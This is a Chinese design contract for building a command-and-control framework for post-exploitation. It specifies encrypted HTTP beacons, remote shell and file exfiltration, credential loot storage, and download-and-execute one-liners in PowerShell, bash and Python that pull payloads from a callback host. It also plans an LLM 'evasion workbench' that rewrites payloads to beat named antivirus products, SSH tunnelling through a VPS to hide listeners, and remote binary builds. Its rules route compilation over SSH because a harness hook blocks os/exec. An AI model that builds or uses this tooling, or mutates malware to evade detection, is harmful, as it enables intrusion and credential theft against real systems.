# C2_CONTRACTS.md — C2 中心契约（**v2，2026-09-26**：§0-§10 为一期冻结稿存档，§11 起为二期增量）

多 agent 并行开发的唯一规范。**本文件由主会话冻结；实现中若必须增改接口，只允许追加方法/字段并在提交说明里列出，禁止改名/改签名/删字段。**

## 0. 模块定位与范围

C2 = 后渗透（stage=post）的指挥控制：自研轻量 beacon（HTTP 回连）+ 监听器 + 会话管理 + AI agent 完整接入。

**本期（wave 1）范围**：监听器（http）、beacon（ps1/bash/py/gosrc 源码）、会话注册/心跳/休眠/终止、shell 命令、文件列表/上传/下载、战利品、载荷生成与投递、8 个 agent 工具、前端 6 页。

**二期（本期不做，但表结构/代码留口）**：https 监听器、隧道（socks5/转发）、免杀工作台（LLM 变形+静态自测）、Go 编译载荷（受 Mimosa 约束，见 §9）、loot→finding 联动、post 阶段内置 agent、同端口部署模式。

**硬约束（违反=Mimosa 拦截或架构破坏）**：
1. 新 Go 源码**禁止 import os/exec**（平台钩子全禁，连常量参数都拦）。一切进程执行走 beacon 自身或 SSH。
2. `c2center/` 包**禁止 import db/server**；一切持久化经 `Store` 接口（§4）回到 server 层。仿 `vpscenter/manager.go` 头注释纪律。
3. **运行时视图过 API 必须带 json tag**（snake_case），或过 DTO 转换（VPS 踩过裸序列化大写字段打崩前端）。
4. 所有返回集合的接口，Go 侧 nil slice 一律初始化为空 slice（Go nil→JSON null 打崩前端，踩过）。
5. 凭据/密钥列在 db 层只见 secretbox 密文；明文只在 server 层内存中出现，接口永不回显明文 key。
6. 测试连库必须显式 `ARTEX_PG_DSN='postgres://postgres@127.0.0.1:5499/postgres?sslmode=disable'`（5499 演示库，绝不连 5432）。
7. 中文测试数据一律 UTF-8 文件 + `--data-binary @file`（Git Bash curl 会 GBK 毁中文）。
8. Go 源码一律用 Write/Edit 工具写，不走 Bash heredoc（Mimosa 拦）。

## 1. 文件所有权矩阵

| 文件/目录 | 所有者 | 其他人 |
|---|---|---|
| `C2_CONTRACTS.md` | 主会话（冻结） | 只读 |
| `db/schema.sql`（C2 段） | 主会话（已改完） | 只读 |
| `web/src/lib/types.ts`（C2 段）、`web/src/lib/api.ts`（c2 段） | 主会话（已改完） | 只读 |
| `web/src/navigation/sidebar/sidebar-items.ts`（C2 分组） | 主会话（已改完） | 只读 |
| `c2center/**`（含 *_test.go） | Agent A | 只读 |
| `db/c2.go`、`server/c2_center.go`、`server/c2_api.go`、`server/c2_agent.go`、`server/server.go`（仅 §6 两处定点插入）、`server/orchestration.go`（仅 §7 一行 append）、`db/c2_test.go` | Agent B | 只读 |
| `web/src/app/(main)/function/c2/**`、`web/src/components/c2-*.tsx` | Agent C | 只读 |
| 集成期修编译错 | 主会话 | — |

**发现需要改非自有文件时：不许动手，写进提交说明/最终报告，由主会话处理。** 共享冻结文件（types.ts/api.ts/schema.sql/sidebar）任何 agent 不得编辑。

## 2. 数据模型（schema.sql 已落地，照此实现）

6 张表：`c2_listeners` / `c2_sessions` / `c2_tasks` / `c2_transfers` / `c2_loot` / `c2_payloads`。完整 DDL 见 `db/schema.sql` 尾部（主会话已追加）。要点：

- `c2_listeners.enc_key` 是 secretbox 密文（BYTEA），明文 32B key 只在 server 层解出后交给 c2center。
- `c2_sessions.sid` 全局唯一（beacon 令牌）；`listener_id+beacon_uid` 幂等复活；`status ∈ online|offline|dead`；`task_id` 可空=绑定任务。
- `c2_tasks.status ∈ queued|sent|done|error`；`actor ∈ user|agent`；`kind ∈ shell|files_list|upload|download|loot|info`。
- `c2_transfers.direction ∈ up|down`（up=平台→目标，down=目标→平台）；`status ∈ queued|running|done|error`。
- `c2_loot.kind ∈ credential|hash|file|screenshot|other`；credential/hash 类 `content` 存 secretbox 密文。
- `c2_payloads.token` 唯一（监听器投递令牌）；`format ∈ ps1|bash|py|gosrc`；`target ∈ windows|linux|macos|cross`。

## 3. Beacon 通信协议（冻结）

**传输**：监听器 = 独立端口的 HTTP server（仿 `proxycenter/pool.go` Pool 模式：Options 注入、New 不启动、Start 里 net.Listen+http.Server goroutine、Stop 用 sync.Once+Shutdown）。信道路径 `POST /<url_path>/e`，载荷投递 `GET /<url_path>/p/<token>`。Content-Type: `application/octet-stream`，body = `base64( AES-256-GCM( json ) )`，密文格式 `nonce(12B) || ciphertext`。

**信封**（JSON，字段名刻意短——省字节也是伪装）：

```
请求公共字段: { "t": 类型, "sid": 会话令牌(reg 时省略), "ts": unix秒, "nc": 随机UUID, "d": 载荷 }
  t=reg   d={uid,hn,us,el,os,ar,ip,pi,pr}   // uid=sha256(listenerID|hostname|username|os)前16hex
  t=poll  (d 省略)                           // 长轮询,server 最多挂 25s
  t=res   d={rs:[{id,st,o,e}]}              // st∈done|error, o=输出b64, e=错误文本; 可与 poll 合并:有结果带结果,顺便拉新任务
  t=file  d={a:"ls|pull|push", tf:transferID, p:"路径", of:偏移, ln:长度, b:b64数据, eof:bool}

响应公共字段: { "t": 类型, "meta": {"sl":sleep秒,"jt":抖动%,"kl":是否退出}, "d": 载荷 }   // meta 每个响应都带
  t=ack
  t=tasks d={ts:[{id,kind,input}]}
  t=file  d={对 ls: {es:[{n,s,d,m}]}  对 pull: {b,eof}  对 push: {}}
```

**安全**：ts 偏移 ±10min；nc 按 sid 存 LRU 去重（1024 条）防重放；body 上限 8MB（文件分片 256KB）；密钥错误一律 404（不暴露端点存在性）。

**beacon 行为规范**（四种格式一致实现）：
1. 启动发 reg → 拿 sid → 循环 poll/res；每次响应的 meta 覆盖本地 sleep/jitter；kl=true 则退出。
2. shell：Linux 走 `sh -c`，Windows 走 `powershell -NoProfile -Command`；stdout+stderr 合并，上限 1MB；非零退出码 status=error。
3. files_list：输出 `[{n,s,d,m}]` JSON（目录浏览）。
4. upload（input={transfer_id,remote_path}）：循环 file/pull 拉平台 blob 分片写远端；download：循环 file/push 推远端分片，先发 size。
5. 连续失败退避：sleep×2 封顶 10 倍；成功复位。
6. UA 固定 `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`；不加重放之外的任何自定义头。
7. gosrc：单文件 main.go 源码工程（zip），内嵌相同逻辑，附 BUILD.md（`GOOS=windows go build` 一行说明）。**c2center 不得 import os/exec——不提供编译，只提供源码包**（编译走二期 VPS 方案）。

**载荷内容**：ps1/bash/py 模板内嵌监听器 callback URL + base64(key) + url_path。一行命令（oneliner）：
- ps1: `powershell -nop -w hidden -c "IEX((New-Object Net.WebClient).DownloadString('<callback>/<url_path>/p/<token>'))"`
- bash: `curl -fsSL <callback>/<url_path>/p/<token> | bash`
- py: `python3 -c "exec(__import__('urllib.request',fromlist=['x']).urlopen('<callback>/<url_path>/p/<token>').read())"`

监听器运行时才能投递载荷；`callback` 为空时生成载荷必须报错提示先填回调地址。

**补充约定（冻结）**：
- reg 的响应 `t=ack`，`d={sid:"会话令牌"}`（beacon 靠它拿到 sid）。
- 每个响应的 `meta` 由 server 从会话行派生：`sl`/`jt` 取 sleep_sec/jitter_pct，`kl = (status=="dead")`——终止会话=置 dead，beacon 下次心跳自行退出，无独立 kill 信令。
- blob 目录读写分工（都在 `<BaseDir>/c2/` 下）：`uploads/` server API 写（上传接口）、c2center 读（beacon pull 分片）；`outputs/` c2center 写（大输出落盘）、server API 读（下载接口）；`downloads/` c2center 写（down 产物）、server API 读；`payloads/` c2center 写（RenderPayload 返回字节，由 server 落盘）、server API 读。文件名一律带数字 id（`<transferID>.bin` 等），路径只由服务端构造。

## 4. c2center 包公共面（冻结，Agent A 实现）

包路径 `github.com/Autumn-27/artex/c2center`，server 内 import 用包名原样 `c2center`。

```go
// Store 是 Manager 需要的持久化能力(由 server 侧实现,桥到 db 包)。仿 vpscenter.Store。
type Store interface {
	// 监听器
	CreateListener(in ListenerInput) (int64, error)
	ListListeners() ([]Listener, error) // 含 SessionCount
	GetListener(id int64) (*Listener, error)
	UpdateListener(id int64, in ListenerInput) error
	DeleteListener(id int64) error
	SetListenerEnabled(id int64, enabled bool) error
	GetListenerKey(id int64) ([]byte, error) // 返回解封后的 32B key(server 适配器里做 secretbox open)
	// 会话
	UpsertSession(in SessionInput) (int64, error) // 按 listener_id+beacon_uid 幂等:存在则更新主机信息并置 online,不存在则建
	GetSessionBySID(sid string) (*Session, error)
	GetSession(id int64) (*Session, error)
	ListSessions(f SessionFilter) ([]Session, int, error)
	SetSessionSleep(sid string, sleepSec, jitterPct int) error
	SetSessionStatusBySID(sid string, status string) error
	BindSessionTask(id, taskID int64) error
	SweepOfflineSessions(graceMultiplier int) (int64, error) // last_seen 超 sleep*(1+grace) 的 online→offline
	// 任务
	CreateTask(in TaskInput) (int64, error)
	TakeQueuedTasks(sessionID int64, limit int) ([]Task, error) // queued→sent 原子批量,返回被取走的
	FinishTask(id int64, status, output, outPath string, outSize int64, errText string) error
	GetTask(id int64) (*Task, error)
	ListTasks(sessionID, afterID int64, limit int) ([]Task, error)
	CountQueuedTasks() (int, error)
	// 文件传输
	CreateTransfer(in TransferInput) (int64, error)
	UpdateTransfer(id int64, status string, doneSize int64, localPath, errText string) error
	ListTransfers(sessionID int64, limit int) ([]Transfer, error)
	GetTransfer(id int64) (*Transfer, error)
	// 战利品
	CreateLoot(in LootInput) (int64, error)
	ListLoot(f LootFilter) ([]Loot, int, error)
	GetLoot(id int64) (*Loot, error) // content 为密文,解密在 server 层
	DeleteLoot(id int64) error
	// 载荷
	CreatePayload(in PayloadInput) (int64, error)
	ListPayloads(listenerID int64) ([]Payload, error)
	GetPayload(id int64) (*Payload, error)
	GetPayloadByToken(token string) (*Payload, error)
	DeletePayload(id int64) error
}

type Manager struct{ /* BaseDir string; 持 store/log/listeners map/ctx */ }
func NewManager(st Store, log *slog.Logger) *Manager
func (m *Manager) Start(ctx context.Context)            // 拉起 enabled 监听器 + 30s 巡检 loop(sweep offline)
func (m *Manager) StartListener(l *Listener) error      // 启动单个监听器(端口被占返回明确错误)
func (m *Manager) StopListener(id int64) error
func (m *Manager) ListenerRunning(id int64) bool
```

结构体（c2center 内定义，**全部带 json tag snake_case**）：`Listener{ID,Name,Proto,BindHost,Port,URLPath,Callback,Enabled,SessionCount,Notes,CreatedAt,UpdatedAt}`、`Session{ID,ListenerID,BeaconUID,SID,Hostname,Username,Elevated,OS,Arch,LocalIPs,PID,Process,SleepSec,JitterPct,TaskID,Status,Labels,Meta(map[string]any),FirstSeen,LastSeen}`、`Task{ID,SessionID,Kind,Input,Output,OutputPath,OutputSize,Status,Actor,CreatedBy,Error,CreatedAt,SentAt,DoneAt}`、`Transfer{ID,SessionID,TaskID,Direction,RemotePath,Size,DoneSize,Status,Error,CreatedAt,DoneAt}`、`Loot{ID,SessionID,TaskID,Kind,Name,Content,BlobPath,SourcePath,FindingID,CreatedAt}`、`Payload{ID,ListenerID,Name,Format,Target,Token,SHA256,Size,Oneliner,CreatedBy,CreatedAt}`；对应 `XxxInput`、`SessionFilter{Status,ListenerID,TaskID,Q,CompanyID,Limit,Offset}`、`LootFilter{Kind,SessionID,Q,Limit,Offset}`。

时间字段统一 `time.Time`（可空用 *time.Time）。可空 int64 一律 0 表示无（COALESCE 惯例）。

单测要求（`go test ./c2center/` 必须全绿，不连库）：fake Store + httptest 起真监听器 → 用 Seal/Open 模拟 beacon 走 reg→下发 shell(假执行)→res→files_list/pull/push 全链路；ts/nc 防重放与密钥错误 404 用例必写。

## 5. server API 面（冻结，Agent B 实现）

注册函数 `func (s *Server) registerC2Routes(mux *http.ServeMux)`（仿 `server/vps_api.go`）；handler 用 `writeJSON/writeErr`；`{id}` 用 `r.PathValue`；分页 `atoiDefault`；集合字段 `nonNilPtrSlice`；body 用 `http.MaxBytesReader`（上传接口 16MB，其余 1MB）。

```
GET    /api/c2/overview                         汇总: 会话三态数/监听器数/排队任务数/最近10会话/最近10任务
GET    /api/c2/listeners                        {listeners:[...],total}
POST   /api/c2/listeners                        {name,bind_host,port,callback,url_path?,notes} → 201 {id}
GET    /api/c2/listeners/{id}
PUT    /api/c2/listeners/{id}                   (同 POST 字段;改 url_path/port 需先停)
DELETE /api/c2/listeners/{id}                   有会话→409
POST   /api/c2/listeners/{id}/start | /stop     启停运行时;返回 {addr} 实际监听地址
GET    /api/c2/sessions?status=&listener_id=&task_id=&company_id=&q=&limit=&offset=
GET    /api/c2/sessions/{id}
POST   /api/c2/sessions/{id}/kill               status→dead,meta 下发 kl
POST   /api/c2/sessions/{id}/sleep              {sleep_sec(1-3600),jitter_pct(0-90)}
POST   /api/c2/sessions/{id}/bind               {task_id} 0=解绑
GET    /api/c2/sessions/{id}/tasks?after_id=&limit=     增量拉取(前端 2s 轮询)
POST   /api/c2/sessions/{id}/tasks              {kind: shell|files_list|info, input} → {id}
GET    /api/c2/tasks/{id}/output                大输出落盘文件下载(output_path)
GET    /api/c2/sessions/{id}/transfers?limit=
POST   /api/c2/sessions/{id}/files/list         {path} → 建任务,返回 task_id(结果从 tasks 轮询)
POST   /api/c2/sessions/{id}/files/upload       multipart: file + path(远端目录) → 建 blob+transfer+upload 任务 → {transfer_id}
POST   /api/c2/sessions/{id}/files/download     {remote_path} → transfer+download 任务 → {transfer_id}
GET    /api/c2/transfers/{id}/download          平台取回下载产物(数字 id 定位,路径服务端构造,防穿越仿 report_export_api.go)
GET    /api/c2/loot?kind=&session_id=&q=&limit=&offset=   列表 content 恒空串,带 has_content
POST   /api/c2/loot                             {session_id,kind,name,content,source_path}
GET    /api/c2/loot/{id}                        content 解密明文(仅此一处)
DELETE /api/c2/loot/{id}
GET    /api/c2/payloads?listener_id=
POST   /api/c2/payloads                         {listener_id,format,target,name} → 201 {id,oneliner};callback 为空→400
DELETE /api/c2/payloads/{id}
GET    /api/c2/payloads/{id}/download           鉴权下载;文件名 Content-Disposition
```

server 侧职责：`c2Store` 适配器实现 c2center.Store（薄桥 db，含 secretbox 解封 GetListenerKey）；blob 目录 `<BaseDir>/c2/{uploads,outputs,payloads}/`；Manager 包级单例（带锁，仿 vpsMgr）。

## 6. 接线（server.go 仅两处定点插入，Agent B 操作）

1. `New()` 里 `initVPS()`（server.go:175 附近）之后加 `initC2()`。
2. `Handler()` 里 `s.registerVPSRoutes(mux)`（server.go:905-908 附近）之后加 `s.registerC2Routes(mux)`。

`initC2()`（在 c2_center.go，仿 initVPS）：`pg := s.m.PG()` → `store := newC2Store(s, pg)` → `mgr := c2center.NewManager(store, slog.Default())` → `mgr.BaseDir = s.m.dir` → set 单例 → `go mgr.Start(s.ctx)`（内部先拉 enabled 监听器）。任务终态不挂钩（C2 会话不随任务终态销毁，二期再议）。

## 7. Agent 工具（8 个，Agent B 实现）

文件 `server/c2_agent.go`，仿 `server/vps_agent.go`：`roTool/wrTool` + `objSchema/strParam` + `jsonResult` 造工具；`RunInfoFrom(ctx).TaskID` 取任务；`seedC2AgentTools()` 用 `SeedToolWithStage(name, desc, schema, ["worker"], "post")` 播种，在 New() 附近调用一次；`orchestration.go` 的 hostTools 里**仅追加一行** `tools = append(tools, s.c2AgentTools()...)`。

| 工具 | 入参 | 行为 |
|---|---|---|
| c2_session_list | {status?} | 列会话(id/status/hostname/user/os/task_id/last_seen) |
| c2_session_info | {session_id} | 主机档案+meta+任务计数 |
| c2_exec | {session_id, command, timeout_sec?(≤300,默认60)} | 建 shell 任务→轮询至终态→返回{status,output(截8KB)}。**stage 门禁：任务 stage≠post 拒绝执行**；下发前过拦截决策（见下） |
| c2_upload | {session_id, remote_path, content_b64} | ≤1MB，建 upload 任务并等完成 |
| c2_download | {session_id, remote_path} | 建 download 任务等完成，返回本地路径+大小+文本前 2KB 预览 |
| c2_loot_record | {session_id, kind, name, content} | 记战利品（credential 自动加密） |
| c2_loot_search | {q?, kind?} | 查战利品库 |
| c2_payload_create | {listener_id, format, target?, name?} | 生成载荷，返回 id+oneliner+投递 URL |

**c2_exec 拦截**：下发前用 `s.m.interceptor`（server/manager.go 已有）按 `guard.applyIntercept` 的模式对命令做 Match（deny→拒绝并返回管控文案；ask→写审批队列并返回「已提交人工审批」）。LLM Judge 若接线复杂可省（只走 Match 硬规则），在代码注释注明。

## 8. 前端（Agent C，严格按冻结的 types.ts/api.ts 写）

路由与页面（静态导出约束：`useSearchParams` 一律包 `React.Suspense`；列表页四件套=搜索+筛选+排序(当前页客户端排序)+`TablePagination`；`table-fixed` 且固定列合计 ≤700px、标题列不设宽度；表格内 ghost 按钮已有全局 CSS 不用管）：

1. `/function/c2` 总览：统计卡（在线/失联/终止、监听器启用数、排队任务）+ 最近上线会话表 + 最近任务表；10s 轮询（仿 vps/page.tsx）。
2. `/function/c2/listeners`：标准列表（名称/回调地址/在线会话数/状态/备注/操作）；新建/编辑 Dialog（name、bind_host 默认 0.0.0.0、port 空=自动、callback、url_path 自动生成可改、notes）；行操作：启停（显示实际 addr）、复制回调地址、编辑、删除；启停失败（端口占用）toast 报错原文。
3. `/function/c2/sessions`：标准列表（状态点：绿 online/灰 offline/红 dead；主机/用户/权限/系统/内网IP/归属任务/心跳/sleep）；筛选 status+listener；行操作：绑定任务（选任务 Dialog）、终止、详情。
4. `/function/c2/detail?id=`：头部主机卡（信息+sleep 调节+终止）+ Tabs（深链 ?tab=）：
   - 交互：输出日志区（monospace 滚动）+ 命令输入行 → POST tasks{kind:shell} → 2s 轮询 tasks?after_id= 增量追加（非真 PTY，页面注明「命令-响应式通道」）。
   - 文件：路径输入+浏览按钮（files_list 任务轮询结果渲染表格：名称/大小/目录/修改时间）+ 上传（FormData）+ 下载（transfer 轮询+完成后取 /api/c2/transfers/{id}/download）+ 传输列表。
   - 流水：该会话全部任务表（时间/操作者/类型/输入截断/状态/输出可展开）。
   - 档案：session 元信息 + 「刷新采集」按钮（info 任务）。
5. `/function/c2/payloads`：生成表单（监听器下拉/格式 ps1|bash|py|gosrc/目标/名称）+ 载荷列表（名称/格式/目标/SHA256 前 12/大小/创建时间/操作：下载、复制一行命令、复制投递 URL、删除）；页内「免杀工作台」占位面板（Badge「二期建设中」，不放可点控件——只读徽标≠筛选器的教训）。
6. `/function/c2/loot`：kind 页签（全部/凭据/哈希/文件/截图/其他，带计数，可点）+ 列表（名称/类型/来源路径/会话/时间/操作：查看(credential 走详情接口明文，弹窗显示)、删除）。

api.ts 调用只准用主会话冻结的 `c2*` 区段；发现缺接口→报告，不准自己加。

## 9. 二期占位（v2 起按 §11 逐项落地；隧道/https/post 内置 agent 挪三期）

- 免杀工作台 `/function/c2/evasion`：`c2_evasion_profiles`/`c2_jobs` 表、LLM 变形管线（仿 report_pipeline.go 异步 job+瞬态重试）、本地静态自测（特征串/熵）。**不接任何外部沙箱（载荷上传第三方=泄漏）**。→ **二期做，见 §13**。
- 编译型载荷：经指派 VPS 的 SSH 执行 go build（vpscenter.ExecCommand 现成）——这是 os/exec 禁令下的编译路径。→ **二期做，见 §14**。
- 隧道：socks5/转发多路复用在长轮询信道上，全模块最重 → **三期**。
- https 监听器：应用层信封已是 AES-GCM 端到端加密，TLS 只剩流量伪装价值 → 与隧道同批（三期）。
- loot→finding：走 exploration 节点创建。→ **二期做，见 §15**。
- post 内置 agent（promptcatalog 补 post_worker）→ 三期。
- **VPS 载体监听器（v2 新增需求，用户指定）**：新建监听器可选 VPS 机器作为载体 → **二期做，见 §12**。

## 10. 验收标准（集成阶段主会话执行）

1. `go vet ./c2center/ ./db/ ./server/` 干净；`go test ./c2center/` 全绿。
2. `GOSUMDB="sum.golang.org" ./build-local.sh out/artex-local` 构建成功（先停 8787+8799 两实例）。
3. 8799 冒烟：建监听器→启停→生成 ps1/bash 载荷→本机跑 bash beacon→会话上线→shell 往返→files_list→loot 记录→overview 计数正确。
4. 前端 6 页可打开、四件套齐全、无 console 崩溃。

---

# 二期增量（v2，2026-09-26 冻结）

## 11. 二期范围与所有权矩阵（v2）

**范围**：① VPS 载体监听器（SSH 远程转发）② 免杀工作台（LLM 变形+静态自测+job 管线）③ 编译型载荷经 VPS 构建 ④ loot→finding 联动。**明确不做（三期）**：隧道 socks5、https 监听器、post 内置 agent。

一期所有硬约束（§0）全部沿用：禁 os/exec、c2center/vpscenter 不 import db/server、运行时视图必须 json tag、nil slice 防御、密文纪律、测试只连 5499、源码走 Write/Edit。**禁改一期冻结文件**（types.ts/api.ts/schema.sql 的 v1 段/sidebar 既有条目）；v2 新增段同样主会话已改完，agents 只读。

| 文件/目录 | 所有者 |
|---|---|
| C2_CONTRACTS.md、schema.sql、types.ts、api.ts、sidebar-items.ts | 主会话（冻结） |
| `vpscenter/forward.go`（新）、`vpscenter/manager.go`（仅追加 forward 相关方法/字段/生命周期接线）、`vpscenter/forward_test.go` | Agent A |
| `c2center/listener.go`（载体抽象+启停编排）、`c2center/beacon.go`（仅 new listener 字段注入回调）、`c2center/manager.go`（仅追加 Carrier 接口与 StartListener 参数，不改既有签名）、`c2center/*_test.go`（对应用例） | Agent A |
| `db/c2.go`（c2_listeners 新列访问器+载体校验查询+payloads 新列）、`server/c2_center.go`（载体启停编排+initC2 尾部追加 `s.initC2Evasion()` 一行）、`server/c2_api.go`（监听器/载荷路由的 v2 扩展） | Agent A |
| `db/c2_evasion.go`（新）、`server/c2_evasion.go`（新：profiles/jobs 路由+LLM 变形 runner+静态自测+stage=post 监看任务）、`server/c2_loot_finding.go`（新） | Agent B |
| `web/src/app/(main)/function/c2/evasion/**`（新）、`web/src/components/c2-evasion-*.tsx`（新）、既有 C2 页面的二期增强（listeners 载体选择/payloads 生成选项/loot 转发现按钮） | Agent C |

**跨 agent 编译耦合（契约钉死）**：`server/c2_evasion.go` 必须提供 `func (s *Server) registerC2EvasionRoutes(mux *http.ServeMux)` 与 `func (s *Server) initC2Evasion()`；Agent A 在 `registerC2Routes` 尾部调用前者、`initC2` 尾部调用后者（各一行，写进 A 的任务）。

## 12. VPS 载体监听器（Agent A）

**机制**：平台进程内的监听器逻辑完全不变（仍绑定本机 127.0.0.1 随机端口），VPS 只做出入口——平台经 **SSH 远程端口转发**（x/crypto/ssh 的 `tcpip-forward` 全局请求 + `forwarded-tcpip` 通道接受，手写实现，**禁 shell 出 ssh 命令**）把 `VPS公网:remote_port` 的流量经 SSH 连接转回本地监听器。流量路径：beacon → VPS:remote_port → SSH 隧道 → 平台 listener。平台掉线=隧道断（与现状一致，beacon 自动重连）。

- **vpscenter/forward.go**：`func (m *Manager) OpenRemoteForward(machineID int64, remotePort int, localAddr string) (*RemoteForward, error)`；`RemoteForward` 持 SSH 连接，`Stop()` 发 `cancel-tcpip-forward` 并关连接；错误回报 channel。拨号/凭据**复用 vpscenter 现有路径**（ExecCommand 同源的连接构造，含 secretbox 解封入口）。转发的每条 TCP 连接 dial localAddr 双向拷贝。单测用进程内 ssh server（照 vpscenter 既有进程内 SSH server 回归测试模式）验证转发往返与 Stop 语义。
- **数据模型（schema 已落）**：`c2_listeners.host_kind('local'|'vps')` / `vps_machine_id` / `remote_port`；`host_kind='vps'` 时 vps_machine_id 必填且 remote_port>0（db 白名单校验兜底 + server 400）。
- **启停编排（server/c2_center.go）**：start：local 直接起；vps 先 `mgr.StartListener`（拿到 127.0.0.1 实际地址）→ `OpenRemoteForward(machineID, remotePort, localAddr)` → forwarder 存 map（keyed by listener id）。stop/进程退出：先 Stop forwarder 再 StopListener。boot 恢复（mgr.Start 拉起 enabled）同样编排。SSH 断开→forwarder 报错→监听器状态标注（日志+runtime 状态），beacon 重试机制兜底。
- **API 面**：`POST/PUT /api/c2/listeners` 增加 `host_kind/vps_machine_id/remote_port` 字段；vps 载体的 `callback` 校验放宽（可空→前端用机器 host 拼）；start 失败原样报 SSH 错误；删除被载体引用的 VPS 机器→409（vps 删除路径加检查，若 vps 删除在 vps_api.go——**那是一期冻结文件，不碰**，改为在报告里提出，主会话处理）。
- **UI（Agent C）**：监听器新建/编辑 Dialog 增加「载体」选择：本机 / VPS 机器（下拉列 `api.vpsMachines()` 的机器，显示名称+host+在线状态）；选 VPS 后出现 remote_port 必填框与 callback 预填（`http://<host>:<port>`，可改）；列表增加载体列（本机 / 机器名）。

## 13. 免杀工作台（Agent B）

**数据模型（schema 已落）**：`c2_evasion_profiles`（name/target_av: defender|360|huorong|generic|custom / payload_format: ps1|bash|py|gosrc / techniques JSONB / instructions / source: manual|llm / notes）；`c2_jobs`（kind: evasion|build / profile_id / payload_id / listener_id / vps_machine_id / task_id / status: queued|running|done|error / input JSONB / result JSONB / error）；`c2_payloads.evasion_profile_id`。

**管线（仿 report_pipeline.go 模式）**：
1. `POST /api/c2/evasion/generate` {listener_id, format, target, name, profile_id?, instructions?} → 建 `c2_jobs`(kind=evasion, queued) + **stage='post' 监看任务行**（真任务，任务中心/对话自动收录，复用报告中心那套；conversation 挂 post）→ 202 {job_id}。防重入：同 profile+listener 有 running job → 409。
2. runner（initC2Evasion 启动，单并发 sem，`analyzeWithRetry` 同款瞬态重试 429/5xx/timeout，最多 2 轮退避）：`c2center.RenderPayload` 出基础载荷 → LLM 变形 → 本地静态自测 → 命中 ≥3 且轮次 <2 则把命中清单喂回再变形一轮 → 满意或轮次用尽 → 落盘 `<BaseDir>/c2/payloads/`、CreatePayload(带 evasion_profile_id)、job done（result 存静态报告+变形轮次）。LLM 无配置 → job error("未配置 LLM")。**LLM 调用全程不动 c2center 包**——变形只发生在 server 侧对已渲染文本的变换。
3. **LLM 提示词（冻结语义）**：系统提示声明角色为「载荷变形引擎」，输入=原始载荷+格式+目标 AV+技术配置+附加指示+上轮命中；输出严格两段 `<PLAN>变形说明</PLAN>` 与 `<CODE>变形后完整载荷</CODE>`；铁律：**信道行为逐字节等价**（CB/UP/KEY/URL_PATH 占位符原样保留、加密与轮询逻辑不动），只允许改变量名/常量编码方式/代码结构/插入无效佐料/字符串拆分，禁止引入外部依赖、禁止改变执行入口与用法、禁止输出解释性文字之外的内容。解析失败（两段缺失）→ 重试一次 → 仍失败 job error。剥围栏逻辑照抄报告管线。
4. **本地静态自测（冻结清单，只本地，永不外传）**：按格式的特征串扫描——ps1: `[-]enc/DownloadString/DownloadFile/IEX/Invoke-Expression/FromBase64String/Set-MpPreference/Add-Type/Win32_Process/Net.WebClient/schtasks/reg add`；py: `[exec(/eval(/urllib/requests./socket./subprocess/base64.b64decode/__import__/pty]`；bash: `[curl/wget//dev/tcp/nc -e/base64 -d/python3 -c/chmod +x]`；gosrc 跳过（走 §14 构建路径）。加 Shanon 熵（>5.5 标高）。结果 {hits:[{marker,count}], entropy, risk: low(<3)|medium(3-5)|high(>5)} 存 job.result。
5. **API**：`GET/POST /api/c2/evasion/profiles`、`PUT/DELETE /api/c2/evasion/profiles/{id}`；`GET /api/c2/jobs?kind=&status=&limit=&offset=`、`GET /api/c2/jobs/{id}`（含 result）、`POST /api/c2/jobs/{id}/retry`（仅 error 可重试，新建 queued job）。

## 14. 编译型载荷经 VPS（Agent A）

- `POST /api/c2/payloads` 的 format=gosrc 新增可选 `build_vps_machine_id`：给了就走构建 job（`c2_jobs` kind=build），不给保持一期行为（只出源码 zip）。
- 构建 runner（server 侧，与免杀 runner 并列但独立 sem）：把 gosrc zip 经 **ExecCommand + base64 分块**写到 VPS 工作区（`<workspace_base>/c2build_<payloadID>/`，`printf '%s' '<chunk>' >> src.b64` 追加→`base64 -d src.b64 > src.zip && unzip`；**禁 os/exec，不引 sftp 新依赖**）→ `go build -trimpath -ldflags "-s -w" -o beacon_<id> ./...`（工作目录内）→ 构建产物 `base64 <二进制>` 分块读回（每块 ≤4MB 原始字节）拼装落盘 → sha256/size 回填 payload 行，`built_on_vps=true`，下载端点照常。VPS 无 go（`command -v go` 探测）→ job error 明确提示先装 Go。构建日志尾部 2KB 存 job.result。
- 超时：单次 ExecCommand 沿用 vpscenter 默认；整个 job 上限 10 分钟。
- **UI（Agent C）**：载荷页 format 选 gosrc 时出现「在 VPS 上编译」可选机器下拉 + 生成后 job 进度展示（轮询 GET /api/c2/jobs/{id}）。

## 15. loot→finding（Agent B）

- `POST /api/c2/loot/{id}/to-finding`：会话必须已绑定任务（否则 400「先在会话页绑定任务」）→ 复用既有发现登记路径（先调研 `report_finding` 登记/`OnFindingRecorded` 链路与 exploration 节点创建代码，**优先复用现成函数**，不自建平行路径）→ 创建 finding（标题=loot name，正文=类型+内容(credential 脱敏提示)+来源路径+会话信息）→ 回填 `c2_loot.finding_id` → 200 {finding_id}。重复转换（finding_id 已非空）→ 409。**联动钩子自动生效**（漏洞库归类/SRC 成果创建走 wireFindingHooks，不要绕过）。
- **UI（Agent C）**：loot 页行操作加「转发现」（已转的显示 finding 徽标可点击跳发现详情）。

## 16. 二期验收（集成阶段主会话执行）

1. vet 三包干净；`go test ./c2center/ ./db/`（5499）全绿；tsc 零错误；全量构建成功。
2. 8799 冒烟：VPS 载体监听器创建/启停（无真机则以进程内 ssh server 的单测为准 + 真机如有则实测）；免杀 generate 在 LLM 无配置时走 error 路径、静态自测 API 直接可验；gosrc 只出源码 zip（无 VPS go 环境）；loot→finding 在绑定任务的会话上真实转换成功。
3. 免杀工作台页/监听器载体 UI/payloads 新选项/loot 转发现按钮可用；一期六页无回归。

---

# 三期增量（v3，2026-09-26 冻结）

## 17. 三期范围与所有权矩阵（v3）

**范围（用户确认）**：① 传输协议 WS/TCP/KCP/OSS 四种（DNS/DoH/DoT 四期）② 载荷矩阵：EXE/DLL/Shellcode(sRDI)/Stage/Stageless/正向(bind)/DLL 正向/eBPF 轻量触发器 ③ 免杀知识库（全网搜集→内置档案种子+变形提示词注入）④ 插件板块（能力包插件库：脚本+二进制）。

一期/二期全部硬约束沿用（禁 os/exec、包边界、json tag、nil 防御、密文纪律、测试连 5499、源码走 Write/Edit、禁改冻结文件）。**共享文件（schema/types/api/sidebar/go.mod 的 v3 段）主会话已改完，agents 只读**。本期开始**仓库在 main 线上多人共享工作树：提交必须显式 pathspec，绝不 `git add -A`，不动他人 WIP**。

